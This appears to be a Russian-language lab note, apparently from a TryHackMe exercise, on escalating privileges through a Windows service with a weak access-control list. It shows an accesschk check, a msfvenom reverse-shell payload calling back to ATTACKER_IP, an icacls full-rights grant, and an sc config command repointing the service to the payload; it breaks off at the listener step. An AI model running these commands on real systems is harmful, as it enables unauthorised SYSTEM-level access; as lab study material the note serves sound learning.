### Уязвимость заключается в том, что права на модификацию файла сервиса не установлены в случае если исполняемый файл не размещен в C:\Program Files или C:\Program Files (86)


#  DACL (Distrectionaly Access Control List) — это список прав доступа к объекту в системе Windows. Он определяет, кто может иметь доступ к объекту, а как и какие права ему на него предоставляются.

# Проверить DACL конкретного сервиса:

accesschk64.exe -qlc vulnservice

* Вывод:
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users   
        SERVICE_ALL_ACCESS    <<< Любой может указать путь до исполняемого файла сервиса
         
# Пользователям предоставлены полные права


1. Генерируем payload и скачиваем файл на целевой машине
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

2. Предоставляем права файлу

icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

3. Изменяем конфигурацию сервиса

sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

3. Запускаем слушатель и рестартуем сервис